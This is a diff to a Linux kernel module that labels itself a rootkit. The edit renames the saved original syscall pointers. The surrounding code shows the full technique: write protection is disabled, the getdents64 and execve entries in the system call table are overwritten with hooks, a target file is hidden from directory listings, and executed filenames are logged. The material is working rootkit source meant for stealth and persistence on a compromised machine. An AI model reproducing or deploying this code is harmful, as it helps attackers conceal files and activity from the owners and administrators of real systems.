@@ -15,8 +15,8 @@ MODULE_DESCRIPTION("Rootkit main entry");
 static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
 // Kernel system call
-asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
-asmlinkage long (*kernel_execve)(const char __user *filename,
+asmlinkage long (*kl_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+asmlinkage long (*kl_execve)(const char __user *filename,
                          const char __user *const __user *argv,
                          const char __user *const __user *envp);
 // Hooked system call
@@ -42,9 +42,10 @@ static int lkm_init(void)
     syscall_table = hook_syscall_table();
     
     DISABLE_WRITE_PROTECTION;
-    kernel_getdents64 = (void *)syscall_table[__NR_getdents64];
-    kernel_execve = (void *)syscall_table[__NR_execve]; 
+    kl_getdents64 = (void *)syscall_table[__NR_getdents64];
+    kl_execve = (void *)syscall_table[__NR_execve]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
+//    kernel_execve("./test", )
     syscall_table[__NR_execve] = (unsigned long *)hooked_execve;
     ENABLE_WRITE_PROTECTION;
     
@@ -108,7 +109,7 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 {
     long rv;
     
-    rv = kernel_getdents64(fd, dirp, count);
+    rv = kl_getdents64(fd, dirp, count);
     rv = hide_file64(targetfile, dirp, rv);
     
     return rv;
@@ -122,7 +123,7 @@ asmlinkage long hooked_execve(const char __user *filename,
     char file[256];
     
     strncpy_from_user(file, filename, 256);
-    rv = kernel_execve(file, argv, envp);
+    rv = kl_execve(file, argv, envp);
     printk("the file is [%s].", file);
     
     return rv;
@@ -134,8 +135,8 @@ static void lkm_exit(void)
     
     // Recover the original system call setting
     DISABLE_WRITE_PROTECTION;
-    syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
-    syscall_table[__NR_execve] = (unsigned long *)kernel_execve;
+    syscall_table[__NR_getdents64] = (unsigned long *)kl_getdents64;
+    syscall_table[__NR_execve] = (unsigned long *)kl_execve;
     ENABLE_WRITE_PROTECTION;
 }
  
